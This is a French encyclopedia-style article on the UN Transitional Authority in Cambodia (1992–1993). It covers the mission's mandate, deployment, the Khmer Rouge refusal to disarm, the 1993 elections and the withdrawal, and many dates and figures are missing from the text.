La mission fut fortement contrariée par la mauvaise volonté de la faction khmère rouge à désarmer ses troupes et du gouvernement de Phnom Penh à soustraire de sa tutelle les administrations centrale, provinciales et locales.
Généralités.
L' en chiffres :
Histoire.
La création de la mission.
La mission était l’aboutissement d’une intense activité diplomatique qui avait débuté après l’invasion vietnamienne du Cambodge en .
La guerre civile qui s’en était suivie ne trouva un répit qu’avec la signature des accords de paix de Paris du . Ses conclusions furent approuvées par le Conseil de sécurité des Nations unies qui demanda, le , à son secrétaire général de préparer un plan détaillé de mise en place d’un processus de retour à la paix.
Il fut décidé d’une période transitoire qui prendrait fin lorsqu’une assemblée législative, élue en conformité avec les accords, aurait choisi un nouveau gouvernement. Le Conseil National Suprême (CNS) cambodgien, composé de représentants de la République populaire du Kampuchéa et des trois composantes de son opposition (les royalistes du FUNCINPEC, les républicains du Front national de libération du peuple khmer et les dirigeants khmers rouges regroupés au sein du Parti du Kampuchéa démocratique (PKD)), fut déclaré comme unique autorité pour assurer la souveraineté, l’indépendance et l’unité du Cambodge pendant la période transitoire. Ce comité devait aussi représenter le Cambodge à l’extérieur, notamment auprès de l’Organisation des Nations unies. Le conseil de sécurité devait de son côté établir une administration, qui allait devenir l’, et le Secrétaire général devait désigner un représentant spécial qui agissait en son nom. Le déléguait à l’ tous les pouvoirs nécessaires à la mise en œuvre des accords et invitait le représentant des Nations unies à toutes ses réunions.
Conformément à ces accords, le , Khieu Samphân et Son Sen, représentants du , arrivent à Phnom Penh mais doivent aussitôt en repartir, manquant de peu de se faire lyncher par une foule en furie.
Le , Boutros Boutros-Ghali, qui venait de succéder à Javier Pérez de Cuéllar au poste de secrétaire général des Nations unies, nommait le japonais Yasushi Akashi comme son représentant spécial au Cambodge. Le , il demandait à l’assemblée générale d’avaliser un projet initial de 200 millions de dollars exigibles dans les plus brefs délais et chargé de couvrir les frais d’installation, de transport, de communications et autres services vitaux. Le programme sera approuvé le .
Le un plan définitif et complet d’implémentation de l’autorité provisoire est soumis au conseil de sécurité. Ce plan prévoit notamment l’envoi d’une composante militaire de dirigés par un commandant des forces armées. Elle incluait 204 membres du quartier général, 485 observateurs militaires, éléments d’infanterie, du génie, et un groupe de support aérien comprenant 326 personnes, 10 avions et 26 hélicoptères, 582 spécialistes du balisage, 541 membres d’une unité médicale, 160 policiers militaires, un bataillon logistique de 872 individus et enfin une unité navale de 376 hommes, 6 patrouilleurs maritimes, 9 fluviaux, 3 péniches de débarquement et 12 autres bateaux. S’il était prévu d’installer la base opérationnelle en Thaïlande, le quartier général était situé à Phnom Penh alors que pour assurer un meilleur fonctionnement, le Cambodge était subdivisé en neuf secteurs dont deux disposeraient de leur propre siège administratif. Le secrétaire général préconisait que les forces militaires soient totalement déployées à la fin mai 1992.
D’autre part, dans le but d’assurer le succès de l’opération il était demandé à toutes les parties cambodgiennes de respecter scrupuleusement leurs engagements et de pleinement coopérer avec la composante militaire de l’ qui demandait de son côté une totale liberté de mouvement et de coopération. Vu l’ampleur de la tâche, il fut décidé d’informatiser l’ensemble des missions. Le Secrétaire général escomptait que cela augmenterait l’efficacité du dispositif et faciliterait son contrôle. Dans le même temps, les différentes composantes avaient besoin, pour fonctionner, d’informations qu’il leur serait difficile d’obtenir avec les moyens existant sur place. Également, pour respecter les accords de Paris, les indications concernant l’état d’avancement des différentes activités devait être communiquées aux quatre composantes du . Il fut suggéré de créer un bureau d’information au quartier général, chargé de collecter et diffuser les renseignements à l’ensemble des acteurs.
L’adoption le , de la résolution 745 du Conseil de sécurité des Nations unies signe la naissance officielle de l’, première opération où l’ ne se contentait plus seulement de superviser une élection, mais devait administrer un État indépendant et dont le mandat ne devait pas dépasser 18 mois.
Le déploiement.
L’autorité provisoire prit la suite de la Mission préparatoire des Nations unies au Cambodge (MIPRENUC) déjà sur place depuis et qui œuvrera jusqu’à ce que l’ soit pleinement opérationnelle. Le déploiement débuta officiellement le avec l’arrivée dans la capitale du japonais Yasushi Akashi, représentant spécial du secrétaire général des Nations unies, du Lieutenant-Général australien John Sanderson, commandant en chef des forces armées et du premier contingent.
Afin de garantir de bonnes relations avec le et son président, Norodom Sihanouk, des lignes de téléphones directes furent mises en place dès le entre le commandant des forces armées, le représentant spécial et les délégués des quatre partis cambodgiens. Yasushi Akashi, en accord avec le prince Sihanouk, prit l’initiative d’élaborer les ordres du jour des réunions du . Sur les ordinaires tenues pendant la mission, 5 eurent lieu avant la fin avril. Des comités de conseil techniques furent créés, dirigés par des officiels de l’, qui couvraient les différents domaines du ressort de l’autorité. Début mai, le personnel des Nations unies s’élevait déjà à sur place, dont plus de . À la fin avril 1992, de police avaient été déployés dans les provinces de Banteay Mean Chey et Battambang, où les réfugiés affluaient. Des mises en place supplémentaires étaient prévues en accord avec le Haut Commissariat des Nations unies pour les réfugiés en fonction du développement des rapatriements. D’autres observateurs furent installés aux trois points de contrôle frontaliers établis par les militaires de l’ et à Phnom Penh. À terme, il était prévu de faire appel à . Leur rôle devait être crucial pour créer un environnement favorable à l’établissement d’élections libres et équitables.
Toutefois, à la fin avril, le nombre restreint d’observateurs promis par les États membres mettait en péril la mission. L’administration civile établit néanmoins des modes opératoires destinés à s’assurer du respect du droit de réunion et de la liberté d’association qui furent présentés au le . Le recrutement de cette administration fut au moins à ses débuts laborieux, vu le haut degré de spécialisation demandé. La surveillance des agences, corps et bureaux en coopération avec les médias cambodgiens ne devint effective qu’à la fin d’avril 1992, une fois mis en place les moyens techniques de contrôler la bonne marche du réseau d’information du pays. On utilisa les systèmes de transmission radio existant du Sud-est asiatique pour diffuser des programmes éducatifs et des nouvelles auprès de la population. Un bulletin d’actualités de l’ a également été mis en place.
Boutros Boutros-Ghali visita le Cambodge du 18 au et, le , il présente un rapport au conseil de sécurité des Nations unies où il estime que les débuts de la mission sont encourageants.
Les premières difficultés.
Par la résolution 766 du , le conseil de sécurité approuve les efforts du secrétaire général pour mettre en place les accords de Paris mais déplore toutefois que le Parti du Kampuchéa démocratique (PKD) entrave le déploiement des forces de l’ dans les zones sous son contrôle ; il demande que la direction khmère rouge accepte de mettre en œuvre la seconde phase du désarmement et les autres aspects de l’accord dans les plus brefs délais. Il appelle aussi le secrétaire général à veiller à ce que l’aide internationale déployée au Cambodge ne se fasse qu’au seul bénéfice des parties qui tiendraient leurs engagements.
Cette réserve montre qu’en cette fin de juillet, alors que avaient été déployés et que le dernier contingent de était en cours d’acheminement, la situation s’était dégradée. Alors que la conjoncture économique restait précaire et que l’hyperinflation menaçait, les délégués du avaient également entamé des manœuvres dilatoires en vue de se soustraire à leurs engagements. Des actions violentes de leur part étaient signalées un peu partout dans le pays. Ainsi, le , un troisième hélicoptère de l’ONU avait essuyé des tirs près de Pailin. Préférant privilégier le dialogue plutôt que le rapport de force, l’ se contenta alors d’une lettre de protestation à l’officier de liaison khmer rouge lui et commanda mille gilets pare-balles pour protéger ses troupes.
Les perspectives n’étaient pas très encourageantes, mais le représentant spécial restait optimiste. Il comptait sur le désir d’un retour à la paix ardemment exprimé par la majeure partie de la population cambodgienne. En dépit du refus continuel du de permettre à l’ d’accéder aux zones qu’il contrôlait et d’autoriser le cantonnement de ses militaires, le secrétaire général affirmait dans son bilan du au conseil de sécurité, que le personnel international aurait acquis un certain pouvoir au Cambodge. Ses troupes avaient été déployées sur la majeure partie du territoire et une présence policière serait perceptible dans la plupart des villages et les Cambodgiens étaient formés aux problèmes de droits de l'homme. Enfin, plus de réfugiés et personnes déplacées avaient été rapatriés. L’ pressait pour que la porte reste ouverte à une participation pleine et entière des membres du au processus de paix. Toutefois, leur volonté persistante de ne pas remplir leurs engagements des accords de Paris constituait une entrave à la bonne marche des opérations.
Les tentatives de négociation.
Dans son rapport du , le secrétaire général demandait également au conseil de sécurité d’étudier toute action visant à montrer la détermination de la communauté internationale à faire appliquer les accords de Paris. Il priait les ministres des Affaires étrangères indonésien et français, coprésidents de la conférence de Paris, d’entreprendre des consultations afin de sortir de l’impasse, ou, si cela s’avérait impossible, de mettre en place les différentes mesures nécessaires à la réalisation des objectifs fondamentaux des accords.
Le le conseil de sécurité confirmait dans sa résolution que le processus électoral devait se dérouler suivant le calendrier préalablement fixé et exigeait du , entre autres choses, de se conformer immédiatement aux obligations qu’il avait contractées lors de la signature des accords de Paris. Il demandait également aux gouvernements japonais et thaïlandais, qui avaient été sollicités pour chercher des solutions à la crise actuelle, de poursuivre leurs efforts. Enfin, le secrétaire général est prié de faire pour le un compte-rendu de l’application de la résolution .
Du 22 au 29 octobre, le Japon et la Thaïlande entreprenaient des pourparlers avec le qui se concluaient par un échec. Plus tard, les 7 et 8 novembre, les coprésidents de la conférence de Paris se réunissaient à Pékin avec le , les représentants des cinq membres permanents du conseil de sécurité des Nations unies, de l’Australie, l’Allemagne, le Japon, la Thaïlande et du secrétaire général. Les coprésidents durent conclure que le n’était toujours pas prêt à coopérer et ses partisans exigeaient de leur côté le démantèlement des structures administratives existantes et la mise en place d’un environnement politique neutre avant de prendre part au processus électoral.
Le , le secrétaire général annonçait au conseil de sécurité la suspension du désarmement et ses craintes quant à la tenue des élections alors que les cantonnements n’avaient pas été menés à terme. Il continuait néanmoins à penser qu’une action diplomatique patiente était le seul moyen de remettre le processus de paix sur les rails. Il préconisait que l' continua son dialogue avec le afin de prendre en compte ses réserves et le persuader de ne pas se soustraire aux obligations qu’il avait contractées lors des accords de Paris.
Dans le même temps, le Conseil de sécurité condamnait le manquement du à ses engagements et décidait d’un embargo pétrolier sur les zones sous son contrôle. Cette mesure ne sera néanmoins pas efficace à cause des complicités de certains officiers et hommes d’affaires thaïlandais.
Vu les circonstances et pour des raisons de sécurité, il n’était pas possible de réduire comme initialement prévu la présence militaire sur le terrain avant les élections. Le problème d’immigration était un autre sujet qui perturbait fortement les Cambodgiens. Les meurtres de villageois d’origine vietnamienne créaient d’importantes difficultés pour le maintien d’un climat de sécurité et la création d’un environnement politique neutre. Les enquêtes de l' montraient que des unités du étaient directement impliquées dans plusieurs de ces incidents.
À partir de septembre 1992, Norodom Sihanouk fit des séjours de plus en plus fréquents à Pékin, officiellement pour y suivre un traitement médical. Afin de conserver une certaine cohésion au sein du , le représentant spécial devait organiser, avec l’accord du prince, des sessions de travail à Phnom Penh, mais Yasushi Akashi n’avait pas le charisme de l’ancien monarque pour faire valider les décisions qui s’imposaient.
Le , Norodom Sihanouk ayant exprimé le désir de se mettre , le passait à 13 membres, accueillant un certain Sam Rainsy comme représentant supplémentaire du FUNCINPEC.
En mars 1993, alors que la situation s’était enlisée et que l' ne semblait pas en mesure de régler la crise, l’ancien (et futur) monarque décide de convoquer une conférence des quatre parties cambodgiennes en vue de former un . Devant le manque d’enthousiasme de , il renoncera (pour un temps) à aller plus avant dans cette initiative.
De son côté, le , après une série de manœuvres dilatoires, annonçait officiellement au le sa décision de ne pas participer au processus électoral, prétextant que l’occupation continue du Cambodge par les forces vietnamiennes était toujours effective et déplorant l’absence d’un environnement politique neutre. Le , Khieu Samphân écrivait au prince Sihanouk que son parti ne participerait plus aux réunions du à Phnom Penh, à cause du manque de sécurité qui y régnait et qu’il quittait temporairement la ville.
Les élections.
Malgré cela, plus de 4 millions de Cambodgiens (environ 90 % des personnes susceptibles de voter) ont choisi parmi les vingt partis en lice aux élections en et ce en dépit des menaces khmères rouges. Le FUNCINPEC du Prince Norodom Ranariddh, profitant notamment de l’aura de Sihanouk et du souvenir qu’avait laissé la période où il dirigeait les destinées du pays, arrive en tête devant le Parti du peuple cambodgien du premier ministre sortant Hun Sen et le Parti libéral démocratique bouddhiste de Son Sann.
Certains élus du Parti du peuple cambodgien, déçus par ce résultat, tentèrent de créer une république dissidente composée des provinces de la frontière Est du pays où ils étaient majoritaires. Cette tentative n'ayant pas abouti, les titulaires qui y ont participé durent céder leur siège aux suivants de la liste du même parti.
Les partis représentés à l’Assemblée se réunirent pour participer à un projet de constitution qui fut approuvé par les députés et promulgué le . Elle établissait une démocratie libérale à partis multiples dans le cadre d’une monarchie constitutionnelle où Norodom Sihanouk retrouvait le titre de roi qu’il avait abandonné en 1955.
Toutefois, le , bien que vainqueur des élections, n'avait pas d’implantation locale et d’administration à proposer. De son côté, le n’était pas disposé à relâcher sa mainmise sur l'administration du pays. Après quelques tractations dont la politique khmère a le secret, le Prince Norodom Ranariddh et Hun Sen furent nommés respectivement premier et second Premiers ministres, chaque ministère important était doublé et tenu par un membre de chacun des deux principaux partis alors que les autres portefeuilles étaient répartis de manière équitable, soit 27 ministres et 21 secrétaires d’État pour chacun.
Le retrait.
Même si une partie du personnel international était resté au Cambodge après les élections, un nombre important avait été retiré, car leur mission était arrivée à terme. La majorité du repli concernait les agents électoraux et avait eu lieu à la fin de juin 1993. Pour des raisons de sécurité, le retrait des employés civils devait être coordonné avec celui des militaires, mais il était difficile car il impliquait le déplacement de milliers de soldats sur des infrastructures gravement endommagées par la saison des pluies. D’après le plan du secrétaire général, il était prévu qu’il entre dans sa phase principale à partir du , et que les troupes auraient quitté le pays au .
Le , le conseil de sécurité, dans la résolution 860, approuve le plan de retrait et la date butoir du pour la fin de celui-ci.
Le mandat confié à l' prit officiellement fin le , quand Norodom Sihanouk, qui avait retrouvé son trône, promulguait officiellement la nouvelle constitution. Enfin, le représentant spécial quittait pour sa part le Cambodge le alors que le retrait de la composante militaire s’acheva comme prévu le , même si le dernier groupe de déminage partit 2 semaines plus tard et qu’enfin les derniers éléments de l’équipe médicale s’en allaient le ..
Le Canada a commencé à retirer ses troupes en , et la plupart des représentants canadiens étaient déjà partis à la fin d'octobre de la même année. Les trois derniers partiraient à leur tour en .
Dans sa résolution 880 du , le conseil de sécurité exprimait sa vive satisfaction quant au fait que la Mission . D’autre part, le conseil rendait hommage au travail de l', . Enfin, le secrétaire général espérait que la communauté internationale serait satisfaite que, malgré les difficultés, l’organisation d’élections libres et équitables ait pu être menée à bien et que la mission laisserait une base solide pour que les Cambodgiens puissent construire un futur stable et paisible.
Après le retrait des forces de l’, plusieurs agences des Nations unies restèrent dans le pays pour aider à la reconstruction et le développement. Ainsi, dès 1993, en conformité avec les accords de Paris, le secrétaire général nommait un représentant spécial chargé des droits de l’homme.
Décoration.
Le ruban.
Le ruban de cette mission est composé de neuf bandes : 
Attribution.
Cette médaille était décernée aux personnes pouvant justifier d’au moins 90 jours de service sur le terrain entre mars 1992 et décembre 1993, date de la fin de l’.
Missions.
Les différentes tâches dévolues à l’autorité avaient été définies dès , lors de la signature des accords de Paris sur le Cambodge et s’articulaient autour des axes suivants :
Les objectifs des accords militaires conclus pour la phase transitoire étaient de stabiliser la situation en matière de sécurité et de créer un climat de confiance entre les parties engagées dans le conflit. La réussite de ces objectifs était une condition préalable et nécessaire au succès des différentes missions. Outre son implication dans le cessez-le-feu et le cantonnement, la composante militaire devait aussi prendre part à d’autres activités telles le contrôle des armements, le rapatriement des réfugiés ou participer à des programmes civils, notamment ceux concernant le déminage, la logistique, les communications et le contrôle des frontières.
Retrait des forces étrangères.
Au terme de l’accord de Paris, devaient être retirés immédiatement ; il était, toujours d’après les termes de l’accord, du ressort de l’ de vérifier que ce retrait était effectif et définitif.
Il avait été envisagé d’établir 24 points de contrôle :
Il devait aussi y avoir plusieurs unités de contrôle mobiles.
Lors de la première phase du déploiement de l’, trois points furent ouverts le long de la frontière vietnamienne. Dès juin 1992 la question revient sur le devant de la scène, lorsque le prétextait la présence au Cambodge de personnel militaire étranger pour suspendre l’application du processus de paix, officiellement jusqu’à ce que l’ ait vérifié leur retrait définitif. Même si la nationalité de ce personnel n’était consignée dans aucun document des Nations unies, les sources khmères rouges ne laissaient planer aucun doute quant à l’origine qu’elles lui attribuaient. Afin de tenir compte de ces réserves, il fut décidé de créer un dixième point de contrôle à la frontière vietnamienne, de déployer l’ensemble des postes de vérification plus tôt qu’initialement prévu et d’inviter les quatre partis à participer à leur mise en place. Les équipes mobiles furent chargées en outre de mener les enquêtes, notamment sur les allégations de présence de forces étrangères. Même si le a confirmé par écrit les accusations qu’il portait, il a refusé de fournir du personnel pour participer aux enquêtes.
De son côté, dès le , le Viêt Nam avait attesté que ses forces, volontaires et équipement avaient été complètement retirés au et n’avait pas été réintroduits depuis, qu’en outre, à cette date, le programme d’assistance militaire avait été suspendu et qu’aucun pays n’avait été autorisé à utiliser une portion quelconque de son territoire pour fournir une aide à un des partis cambodgiens.
Si l’on en croit Jean-Claude Pomonti, correspondant du Monde à Bangkok, il semble toutefois que le gouvernement de Hanoï ait conservé jusqu’en juillet 1991, un effectif d’environ chargés d’apporter une assistance discrète à l’armée de la République populaire du Kampuchéa alors en lutte contre les troupes khmères rouges.
Le , le conseil de sécurité confirmait son souhait de voir les points de vérification frontaliers recommandés préalablement par le secrétaire général rapidement établis. En novembre, les forces militaires jusqu’alors chargée de procéder au cantonnement des troupes des différents partis, étaient redéployées au contrôle des frontières, à la suite de la suspension du désarmement causée par le refus khmer rouge de coopérer. L’ consacrait néanmoins une attention toute particulière à la possible présence de troupes étrangères au Cambodge. Elle demandait continuellement aux partis cambodgiens d’étayer leurs insinuations avec des informations vérifiables, mais aucun ne le fit. Elle mit aussi en place des équipes d’enquêteurs qui devaient examiner les accusations. Ces unités ne trouvèrent aucune preuve de la présence de troupes armées organisées dans les zones auxquelles elles avaient accès.
En fait, il s’agissait d’une divergence de point de vue. Là où les troupes internationales cherchaient des qu’elles ne trouvaient pas, le , comme une grande partie de la population cambodgienne se plaignait de la recrudescence de l’immigration vietnamienne depuis 1979, considérant ces arrivants comme les agents d’une vietnamisation rampante du pays alors que le gouvernement de Hanoï prétendait pour sa part qu’il ne s’agissait pour l’essentiel que d’une partie des personnes chassées par la République khmère au début des années 1970. En réalité, il apparait clairement que le Cambodge était alors considéré comme une terre d’opportunités par nombres de vietnamiens fuyant le chômage endémique de leur pays. Des études estiment le flux à , ce qui dans un pays où la population était alors estimée à 7 millions d’habitants est loin d’être négligeable, surtout quand on y rajoute les du corps expéditionnaire stationné dans les années 1980. Dans le même temps, les milices khmères rouges avaient lancé des opérations contre la communauté vietnamienne et le gouvernement de Phnom Penh n’avait pas hésité à fournir des armes à d’anciens "Bô Dôi" et déserteurs qui s’étaient établis au Cambodge afin qu’ils puissent assurer par eux-mêmes leur protection ; cela ne pouvait qu’ajouter à la confusion qui régnait alors et était de plus contraire à l’esprit des accords de Paris.
Le , lors d’une réunion du , Khieu Samphân avait plaidé que ces immigrés cachaient en fait officiers et qui formaient l’épine dorsale du régime de Phnom Penh ; il était donc nécessaire d’après lui de démanteler toute l’administration en place pour assurer un retrait effectif des troupes étrangères du pays.
À l’occasion des opérations qui suivirent, l’ découvrait . Ces trois hommes qui avaient fait partie du corps expéditionnaire s’étaient mariés avec des Cambodgiennes et deux d’entre eux se livraient à des missions ponctuelles au sein de l’armée de Phnom Penh alors que le troisième aurait pris sa retraite en 1990. Hanoï refusait de son côté de rapatrier ces trois soldats au prétexte qu’ils . Le conseil de sécurité, dans sa résolution 810 du , renouvelait pour sa part sa demande de départ immédiat de toutes les forces et conseillers étrangers.
Enfin, le , alors que la présence de troupes thaïlandaises dans les zones khmères rouges était devenu un secret de Polichinelle et que l’ n’était pas autorisée à aller y enquêter, le persistait à affirmer que des forces vietnamiennes continuaient à occuper le Cambodge pour justifier devant le sa décision de ne pas participer aux élections prévues en mai.
Respect de l’intégrité territoriale.
Le respect de l’intégrité territoriale faisait à lui seul l’objet d’un texte spécifique des accords de Paris, ce qui montre qu’il était au centre de préoccupations importantes.
De nombreux témoignages affirmaient que des empiétements avaient eu lieu sur la frontière vietnamienne au détriment du Cambodge lorsque le pays était occupé par les troupes de Hanoï.
Des recherches débutent donc à la frontière thaïlandaise et constatent plusieurs impromptues, mais l’enquête est interrompue à la demande du gouvernement de Bangkok.
Depuis, l’opposition cambodgienne dénonce les amputations régulières de territoires cambodgiens à la frontière orientale.
On ne peut donc que regretter que la suggestion de Lau Teik Soon, directeur du département des sciences politiques de l’université nationale de Singapour, de profiter de l’occasion pour régler définitivement les contentieux sur les frontières avec la Thaïlande et le Viêt Nam, n’ait malheureusement pas été menée à bien ; cela aurait certainement éviter les troubles qui n’ont pas manqué d’empoisonner plus tard la vie politique cambodgienne.
Désarmement.
Dès le , le secrétaire général affirmait : . Au premier rang de ces engagements se trouvait le respect d’un cessez-le-feu et d’un désarmement des forces en présence dont l’issue devait déterminer le succès des autres missions&lt;ref name="ONU A/46/617"&gt;&lt;/ref&gt;.
La mise en place.
Pour être efficace, un cessez-le-feu et un désarmement nécessitait de pouvoir rapidement évaluer les forces en présence, leurs armements et positions ainsi que celles des champs de mines et autres engins piégés. Chaque camp s’était engagé à s’abstenir de tout acte hostile ou action susceptible d’étendre le territoire sous son contrôle.
Les forces des différentes parties cambodgiennes devaient être regroupées dans des zones de cantonnements, leurs armes et munitions entreposés, le tout sous le contrôle de l’ qui devait aussi enquêter sur les violations de cet accord. En , les informations collectées auprès des différentes parties cambodgiennes permettaient d’estimer les forces à plus de présents dans près de 650 lieux différents et environ miliciens déployés dans la plupart des villages. On avait aussi recensé pas loin de fusils et plus de 80 millions de munitions. Le plan initial stipulait que 70 % de ces forces soient désarmées et démobilisées à la fin septembre 1992. L’accord prévoyait de regrouper et cantonner l’ensemble de ces forces et de ces armes. Cette activité nécessitait toutefois de faire appel à un important déploiement de troupes des Nations unies et risquait de sérieusement mettre en péril la vie économique et sociale du pays, vu que nombre de miliciens menait de concert leur mission et une activité agricole ou commerciale. Afin de remédier à ce problème, le secrétaire général proposa que des arrangements puissent être négociés au cas par cas entre toutes les parties pour que seules les armes de certains soient remises aux soldats de l’.
Après consultation des différentes parties, le nombre de zones de regroupement est ramené de 325 à 95 et celles de cantonnement de 317 à 52. Les forces gouvernementales de l’État du Cambodge se voyaient attribuées 48 regroupements et 33 cantonnements, celles de l’armée khmère rouge du Parti du Kampuchéa démocratique (PKD) respectivement 30 et 10, celles du Front national de libération du peuple khmer de Son Sann 8 et 6, enfin celles du Front uni national pour un Cambodge indépendant, neutre, pacifique et coopératif de Norodom Sihanouk 9 et 3. Le nombre de cantonnements sera plus tard porté à 55 (33 pour les forces gouvernementales, 14 pour les troupes khmères rouges, 5 pour le et 3 pour les sihanoukistes) La marine cambodgienne qui disposait d’un effectif de , de 18 navires et de 38 embarcations fluviales, devait être réduite de la même manière, à part quelques bateaux destinés à la surveillance des côtes et des rivières sous le contrôle de l’. Les unités du génie et de la logistique seraient aussi sujettes à des arrangements en vue de les reverser dans le programme de déminage et de soutien aux forces cantonnées. De plus, une aide au retour à la vie civile des démobilisés était provisionnée, bénéficiant d’un budget compris entre 9 et 14 millions de dollars US.
À la fin d’, l’ avait déployé . Dans le même temps, des équipes de formation au déminage avaient été instruites pour éduquer près de Cambodgiens dont beaucoup devaient provenir des soldats à démobiliser. Ces nouvelles compétences allaient contribuer à la réhabilitation du pays et à créer des emplois.
À Kampong Thum toutefois, où la situation demeurait explosive, 240 soldats internationaux devaient imposer le cessez-le-feu. Une enquête avait notamment été ouverte concernant l’incident du où un hélicoptère des Nations unies avait essuyé des tirs. Les résultats montrèrent l’implication de membres des troupes khmères rouges, alors que leur hiérarchie contestait toute responsabilité.
Le , l’ annonce la fin de la première phase du cessez-le-feu qui avait débuté à la signature des accords de Paris et que la seconde phase, à savoir le cantonnement, le désarmement et la démobilisation, commencera le . Cette décision fut prise après que le commandant des forces armées eut consulté les quatre parties cambodgiennes et obtenu d’eux l’assurance qu’ils laisseraient une totale liberté de mouvement aux troupes, véhicules et avions de l’, qu’ils fourniraient les plans des champs de mines dans les territoires sous leurs contrôles et procureraient pour le toutes les informations nécessaires sur leurs troupes, armements, munitions et équipements ; enfin, ils acceptaient de se conformer aux accords de paix, notamment de prévenir leurs unités de la mise en place du regroupement et du cantonnement et enfin de ne pas interférer sur ceux-ci.
Le refus khmer rouge.
Toutefois, malgré ces annonces, les éléments khmers rouges ne coopéraient pas au processus et entravaient la circulation des troupes internationales. Cette mauvaise volonté était déjà manifeste lors du déploiement de la , notamment quand un des hélicoptères de la force internationale avait survolé les zones sous leur contrôle et avait essuyé des tirs. À l’époque le général français Michel Loridon, chef de la mission, soumis au droit de réserve avait été contraint de minimiser l’affaire en déclarant de manière alambiquée qu’on ne savait pas si elle était due à . Dans le même temps, Son Sen, chef des forces khmères rouges avait alors prétendu que l’accès de la .
Le , lors d’une réunion du , le représentant spécial demanda à toutes les parties d’attester par écrit qu’elles étaient prêtes à se conformer à un plan en douze points comprenant notamment la démobilisation d’au moins 70 % de leurs forces. Seules trois des quatre composantes donnèrent leur accord ; le , outre qu’il s’abstint de fournir les informations demandées, fit savoir le par la voix de ses représentants que pour des raisons de sécurité, il devait interdire aux troupes de l’ de se déplacer dans les zones sous son contrôle. Le secrétaire général a alors lancé un appel personnel à Khieu Samphân, président du mouvement khmer rouge, pressant son parti de faire le nécessaire pour que la phase II puisse commencer comme prévu le . La réponse faite n’apporta aucune des garanties demandées.
Une nouvelle demande fut présentée par le représentant spécial lors de la réunion du du 5 juin. Le , le adressait une lettre à l’, répétant qu’il n’était pas en position de permettre aux troupes internationales de se déployer dans les zones sous son contrôle.
Le refusait une fois encore de répondre favorablement à la demande formulée lors de la réunion du du 10 juin, lui enjoignant de respecter les engagements pris lors de la signature des accords de Paris, et de se conformer aux 12 points du plan du 26 mai pour permettre de démarrer la phase II comme prévu le . Le maintenait sa position en réitérant qu’outre des réserves concernant l’efficacité du contrôle des structures administratives existantes, la présence de forces militaires vietnamiennes au Cambodge l’obligeait pour sa propre sécurité à différer la mise en application de la phase II. L’envoyé spécial rejeta ce point de vue mais mit néanmoins en place des mesures en vue de prendre en compte les réserves du . Même si le succès de la seconde phase dépendait d’une totale collaboration entre toutes les parties, il fut décidé d’en maintenir le début comme prévu au . Le secrétaire général justifia cette décision en arguant que tout retard serait préjudiciable à la tenue des élections en avril ou mai 1993.
Le représentant spécial consulta les trois autres parties pour essayer de minimiser l’impact négatif que le regroupement et le cantonnement de leurs troupes pourraient avoir sur le maintien des escouades khmères rouges. Il n’en demeurait pas moins que la neutralisation des forces fidèles aux trois factions qui respectaient les accords permit aux partisans de Pol Pot d’agrandir leurs zones d’influence et d’y accroitre la violence politique.
Les tentatives de négociation.
Il ne pouvait s’agir toutefois que d’une solution temporaire et il était impératif de mettre en œuvre tous les efforts possibles pour ramener les délégués du à la table des négociations. Le secrétaire général demandait au conseil de sécurité d’envisager quelles actions pouvaient être menées pour atteindre les objectifs fixés. Le conseil réaffirma l’importance cruciale de respecter totalement et rapidement les décisions des accords de Paris et pressa pour que la seconde phase des dispositions militaires démarre le et, comme initialement prévu que le regroupement et le cantonnement ne prennent pas plus de quatre semaines. Le à Tokyo, lors d’une conférence des pays donateurs, il fut proposé de prendre en compte certaines des réserves du . Le même jour, lors d’une réunion extraordinaire du , il est demandé aux quatre parties cambodgiennes de répondre à ces propositions.
Trois les acceptèrent ; les représentants du promirent d’étudier l’offre et de donner leur réponse plus tard. Le , plus de du , soit environ le tiers de leurs effectifs déclaré, déposèrent leurs armes à au nord-ouest de Siem Reap ; à cette date, près de combattants avaient été cantonnés.
Le , le présenta ses propres propositions concernant le rôle et le pouvoir du et demandait rien de moins que le démantèlement des structures administratives dans les zones contrôlées par le régime de l’ancienne République populaire du Kampuchéa. Il proposait notamment de créer au sein des organes existants des commissions consultatives composées de membres des quatre parties cambodgiennes et présidées par l’.
Le le secrétaire général adressait une lettre à Khieu Samphân, l’assurant que le représentant spécial poursuivrait ses efforts pour prendre en considérations, sur la base des propositions de Tokyo, les réserves légitimes émises par le ainsi que celles des trois autres parties. À une réunion du 8, juillet, Khieu Samphân réitérait les suggestions du qu’il confirmait dans une lettre adressée le au secrétaire général. Outre les réunions du , le représentant spécial rencontra trois fois Khieu Samphân pour obtenir qu’il valide la proposition de Tokyo et le persuader de faire le nécessaire pour respecter les accords de Paris alors que de leur côté les délégués khmers rouges appelaient à la dissolution des principales institutions établies par les autorités de Phnom Penh. En réponse, Yasushi Akashi rappela que d’après les accords de Paris, le contrôle de l’ devait s’exercer à travers les structures administratives existantes des quatre parties cambodgiennes et non se substituer à elles.
Échec du cantonnement.
Le , date à laquelle le cantonnement était censé prendre fin, sur un effectif estimé de , le regroupement concernait de la république populaire du Kampuchéa, de l’armée sihanoukiste, partisans du Front national de libération du peuple khmer et aucun du .
Lorsqu’il reporte la situation au conseil de sécurité, le , le secrétaire général propose deux solutions : soit les opérations sont suspendues jusqu’à ce que toutes les parties se conforment aux accords de Paris, soit le processus est poursuivi malgré le manque de coopération du afin de montrer aux Cambodgiens la détermination de la communauté internationale à les aider. Considérant la seconde approche comme la plus appropriée, il demanda à son envoyé spécial d’accélérer le cantonnement tout en prenant garde à maintenir la sécurité dans les campagnes et à effectuer les regroupements dans des zones où il ne risquait pas d’y avoir de confrontations militaires. La principale question en suspens restait comment amener les représentants du à respecter leurs obligations tout en prouvant la détermination de l’ à mettre en œuvre les accords et à obtenir la pleine coopération de tous les signataires pour que l’ puisse mener à bien son mandat.
À la fin juillet 1992, le représentant spécial reporta au secrétaire général que la situation militaire s’était dégradée, que les troupes khmères rouges se livraient à des actions violentes dans le nord, le sud et une partie du centre du pays, profitant du vide laissé par le cantonnement des trois autres parties. Au même moment, certains éléments du étaient désireux de déposer les armes et rejoindre leurs familles, mais leurs dirigeants les en empèchaient.
Bien que l’ ait accepté de recevoir les plaintes des partisans de Pol Pot, aucune coopération n’était apparue en retour&lt;ref name="ONU S23370/Add.29"&gt;&lt;/ref&gt;.
Les membres du ne voulaient rien de moins qu’une dépolitisation radicale qui aurait entrainé la défaite du régime de Phnom Penh, chose qu’ils n’avaient pu obtenir ni sur le champ de bataille ni lors des accords de Paris. Dans le même temps, leur radio laissait entendre que l’ était à la solde des dirigeants de la République populaire du Kampuchéa et du Viêt Nam.
